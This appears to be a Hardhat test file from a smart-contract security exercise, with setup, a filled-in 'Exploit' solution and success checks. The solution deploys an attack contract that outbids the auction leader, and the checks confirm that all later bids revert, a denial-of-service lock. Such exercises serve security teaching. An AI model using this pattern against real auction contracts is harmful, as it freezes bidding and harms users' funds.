const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('DOS Exercise 2', function () {

    let deployer, user1, user2, attacker;

    const USER1_FIRST_BID = ethers.utils.parseEther('5'); 
    const USER2_FIRST_BID = ethers.utils.parseEther('6.5');
    
    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, attacker] = await ethers.getSigners();

        const AuctionFactory = await ethers.getContractFactory(
            'contracts/dos-2/Auction.sol:Auction',
            deployer
        );
        this.auction = await AuctionFactory.deploy();

        // Invest
        await this.auction.connect(user1).bid({value: USER1_FIRST_BID});
        await this.auction.connect(user2).bid({value: USER2_FIRST_BID});

        expect(await this.auction.highestBid()).to.be.equal(USER2_FIRST_BID);
        expect(await this.auction.currentLeader()).to.be.equal(user2.address);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        let currentHighestBid = await this.auction.highestBid();
        const AttackAuctionFactory = await ethers.getContractFactory(
            'contracts/dos-2/solution/AttackAuction.sol:AttackAuction',
            attacker
        );
        this.attackContract = await AttackAuctionFactory.deploy(
            this.auction.address,
            {value: currentHighestBid.add(ethers.utils.parseEther('0.00000001'))}
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Current highest bid
        let highestBid = await this.auction.highestBid();
        
        // Even though User1 bids highestBid * 3, transaction is reverted        
        await expect(this.auction.connect(user1).bid({value: highestBid.mul(3)})).to.be.reverted;

        // // User1 and User2 are not currentLeader
        expect(await this.auction.currentLeader()).to.not.be.equal(user1.address);
        expect(await this.auction.currentLeader()).to.not.be.equal(user2.address);
    });
});
